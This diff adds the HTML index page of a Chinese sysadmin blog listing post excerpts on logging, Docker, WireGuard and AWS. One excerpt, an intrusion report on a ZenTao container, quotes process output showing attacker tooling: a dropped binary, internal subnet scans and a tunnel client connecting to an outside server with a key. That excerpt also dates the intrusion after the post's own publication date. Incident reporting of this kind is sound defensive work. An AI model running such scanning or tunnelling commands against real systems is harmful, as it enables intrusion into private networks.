@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next-haha.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next-haha.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next-haha.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ming.theyan.gs","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="好记性比不过烂笔头">
+<meta property="og:type" content="website">
+<meta property="og:title" content="运维烂笔头">
+<meta property="og:url" content="https://ming.theyan.gs/index.html">
+<meta property="og:site_name" content="运维烂笔头">
+<meta property="og:description" content="好记性比不过烂笔头">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="老杨">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://ming.theyan.gs/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>运维烂笔头 - 一个 SA 老兵的工作日志</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106574959-2"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-106574959-2","only_pageview":false,"measure_protocol_api_secret":null}</script>
+  <script src="/js/third-party/analytics/google-analytics.js" defer></script>
+
+  <script src="/js/third-party/analytics/baidu-analytics.js" defer></script>
+  <script async src="https://hm.baidu.com/hm.js?fdef9ded31bdb8b2dab08eddebdd5fed"></script>
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+<!-- google adsense -->
+<script data-ad-client="ca-pub-1045025618858716" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="运维烂笔头" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">运维烂笔头</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个 SA 老兵的工作日志</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-projects"><a href="/projects" rel="section"><i class="fa fa-code fa-fw"></i>projects</a></li><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">老杨</p>
+  <div class="site-description" itemprop="description">好记性比不过烂笔头</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">508</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/haw-haw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;haw-haw" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@theyan.gs" title="E-Mail → mailto:blog@theyan.gs" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/1494877243" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;1494877243" rel="noopener me" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/6fool" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;6fool" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://bad-pencil.github.io/" title="https:&#x2F;&#x2F;bad-pencil.github.io" rel="noopener" target="_blank">github 镜像站</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://hawhaw.gitee.io/" title="https:&#x2F;&#x2F;hawhaw.gitee.io" rel="noopener" target="_blank">gitee 镜像站</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/11/centralized-logging-loki/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/11/centralized-logging-loki/index.html" class="post-title-link" itemprop="url">centralized logging 2 using promtail, loki</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-20 20:37:19" itemprop="dateCreated datePublished" datetime="2024-11-20T20:37:19+08:00">2024-11-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-21 21:42:35" itemprop="dateModified" datetime="2024-11-21T21:42:35+08:00">2024-11-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>之前用 rsyslogd 做过一个集中的 log server，主要是收集服务器系统和审计日志。最近要做的这个集中的 log server，则是专注于收集、展示应用日志的。我现在的服务器，操作系统有两种：Debian 12(bookworm) 和 Ubuntu 24.04，准确的说：应用服务器都是 Ubuntu 24.04，只有运维专用的两台（含要做的这个 log server）是 Debian 12。</p>
+<p>因为是小厂，所以就摒弃掉大而重的 elasicsearch 系的方案，直接用 grafana 同源的 loki 来做服务端，客户端收集日志也是 grafana 同源的 promtail，技术方案选型就这么愉快得决定了。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/11/centralized-logging-loki/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/10/%E7%A6%85%E9%81%93%EF%BC%88zentao%EF%BC%89%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8A%A5%E5%91%8A/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/10/%E7%A6%85%E9%81%93%EF%BC%88zentao%EF%BC%89%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8A%A5%E5%91%8A/index.html" class="post-title-link" itemprop="url">禅道（zentao）被入侵的相关信息</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-13 18:28:45" itemprop="dateCreated datePublished" datetime="2024-10-13T18:28:45+08:00">2024-10-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-21 19:51:22" itemprop="dateModified" datetime="2024-10-21T19:51:22+08:00">2024-10-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="发现时间"><a href="#发现时间" class="headerlink" title="发现时间"></a>发现时间</h2><p>最早发现是 2025-05-06 下午，发现 PVE 的香港出口带宽异常，接着发现跟 176.32.35.190 的 tcp 端口 8024 有大量的数据交互</p>
+<p>然后在 2025-05-07 上午，用 <code>docker exec -it zentao /bin/bash</code> 进入容器，<code>apt install psmisc</code>，然后 <code>pstree -a</code> 才确认被入侵的。</p>
+<p>zentao 容器内执行 <code>pstree -a</code> 输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">s6-svscan /etc/s6/s6-enable</span><br><span class="line">  |-s6-supervise 00-mysql</span><br><span class="line">  |   `-mysqld_safe /opt/zbox/run/mysql/mysqld_safe ...</span><br><span class="line">  |       `-mariadbd --defaults-file=/data/mysql/etc/my.cnf--basedir=/opt/zbox/run</span><br><span class="line">  |           `-13*[&#123;mariadbd&#125;]</span><br><span class="line">  |-s6-supervise 02-sentry</span><br><span class="line">  |   `-tail -f /tmp/sentry.log</span><br><span class="line">  |-s6-supervise 03-roadrunner</span><br><span class="line">  |   `-rr serve -c /apps/zentao/roadrunner/.rr.yaml</span><br><span class="line">  |       `-5*[&#123;rr&#125;]</span><br><span class="line">  |-s6-supervise 01-apache</span><br><span class="line">  |   `-apachectl /opt/zbox/bin/apachectl -D FOREGROUND</span><br><span class="line">  |       `-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |   `-sh -c ...</span><br><span class="line">  |           |       `-sh -c cd /tmp;./slix;echo 60b45fc9adc5;pwd;echo b0c6bc8c2</span><br><span class="line">  |           |           `-slix</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |-sh</span><br><span class="line">  |           |               |   `-scanb.sh ./scanb.sh</span><br><span class="line">  |           |               |       `-fs -h 192.168.38.0/24 -o 192b.txt -t 5 -np ...</span><br><span class="line">  |           |               |           `-8*[&#123;fs&#125;]</span><br><span class="line">  |           |               `-4*[&#123;slix&#125;]</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |   `-sh -c...</span><br><span class="line">  |           |       `-sh -c...</span><br><span class="line">  |           |           `-ns -server=176.32.35.190:8024 -vkey=82yukro912ktndfc ...</span><br><span class="line">  |           |               `-11*[&#123;ns&#125;]</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           |-httpd -D FOREGROUND</span><br><span class="line">  |           `-httpd -D FOREGROUND</span><br><span class="line">  `-scanb.sh ./scanb.sh</span><br><span class="line">      `-fs -h 192.168.39.0/24 -o 192b.txt -t 5 -np</span><br><span class="line">          `-8*[&#123;fs&#125;]</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/10/%E7%A6%85%E9%81%93%EF%BC%88zentao%EF%BC%89%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8A%A5%E5%91%8A/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/09/something%20about%20healthcheck%20for%20Docker%20container/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/09/something%20about%20healthcheck%20for%20Docker%20container/index.html" class="post-title-link" itemprop="url">something about healthech for docker container</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-21 19:19:27" itemprop="dateCreated datePublished" datetime="2024-09-21T19:19:27+08:00">2024-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-09-27 21:33:19" itemprop="dateModified" datetime="2024-09-27T21:33:19+08:00">2024-09-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>在 Docker compose 文件里使用健康检查的方案变迁。<br>背景：小厂，用不起 kubernetes，只能自己生写 docker compose 来部署 Docker 容器。以下以一个在容器里监听 tcp 端口 8090 的服务为例来描述一下我用到过的健康检查的方案的变迁。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/something%20about%20healthcheck%20for%20Docker%20container/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/08/WireGuard%20%E6%BA%90%20IP%20%E5%9C%B0%E5%9D%80%22%E6%BC%82%E7%A7%BB%22%E9%97%AE%E9%A2%98%E7%9A%84%E5%89%8D%E5%9B%A0%E5%90%8E%E6%9E%9C/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/08/WireGuard%20%E6%BA%90%20IP%20%E5%9C%B0%E5%9D%80%22%E6%BC%82%E7%A7%BB%22%E9%97%AE%E9%A2%98%E7%9A%84%E5%89%8D%E5%9B%A0%E5%90%8E%E6%9E%9C/index.html" class="post-title-link" itemprop="url">WireGuard 源 IP 地址"漂移"问题的前因后果</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-08-17 21:24:36" itemprop="dateCreated datePublished" datetime="2024-08-17T21:24:36+08:00">2024-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-08-23 22:52:27" itemprop="dateModified" datetime="2024-08-23T22:52:27+08:00">2024-08-23</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>在现代网络架构中，VPN（虚拟专用网络）技术的应用越来越广泛。本文将探讨在我司 IDC 中，使用 WireGuard 实现的 VPN 连接中遇到的一个有趣现象。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/08/WireGuard%20%E6%BA%90%20IP%20%E5%9C%B0%E5%9D%80%22%E6%BC%82%E7%A7%BB%22%E9%97%AE%E9%A2%98%E7%9A%84%E5%89%8D%E5%9B%A0%E5%90%8E%E6%9E%9C/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/07/the%20bug%20of%20cloudfront/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/07/the%20bug%20of%20cloudfront/index.html" class="post-title-link" itemprop="url">AWS cloudfront 的一个小 bug</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-07-19 23:24:31" itemprop="dateCreated datePublished" datetime="2024-07-19T23:24:31+08:00">2024-07-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-07-25 12:36:17" itemprop="dateModified" datetime="2024-07-25T12:36:17+08:00">2024-07-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>我厂有一个网站（域名 <code>a.b.com</code> 和 <code>a1.b.com</code>），原来是跑在自己 IDC 里的机器上的，用 Docker 容器跑的，容器里就一个 nginx，放了一堆的静态资源。</p>
+<p>为了“用户体验”，这两个域名都上了 CDN（AWS 的 cloudfront），源站分别是：</p>
+<ol>
+<li><code>a.ori.b.com</code></li>
+<li><code>a1.ori.b.com</code></li>
+</ol>
+<p>最近做了一次架构调整，把这个服务迁移到了 AWS 的 EC2 上，而且将这个服务放在了一个 ALB 的后面，这个 ALB 是启用了 cloudfront 集成的，所以，我在 route 53 上就把这两个域名都解析到了 ALB 集成的这个 cloudfront distribution 的域名上了。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/07/the%20bug%20of%20cloudfront/index.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://ming.theyan.gs/2024/06/Prometheus%20%E5%AE%98%E6%96%B9%20Docker%20image%20%E7%9A%84%E4%B8%80%E4%B8%AA%20bug/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="老杨">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="运维烂笔头">
+      <meta itemprop="description" content="好记性比不过烂笔头">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 运维烂笔头">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/06/Prometheus%20%E5%AE%98%E6%96%B9%20Docker%20image%20%E7%9A%84%E4%B8%80%E4%B8%AA%20bug/index.html" class="post-title-link" itemprop="url">Prometheus 官方 Docker image 的一个 bug</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-06-17 19:35:42" itemprop="dateCreated datePublished" datetime="2024-06-17T19:35:42+08:00">2024-06-17</time>
+    </span>
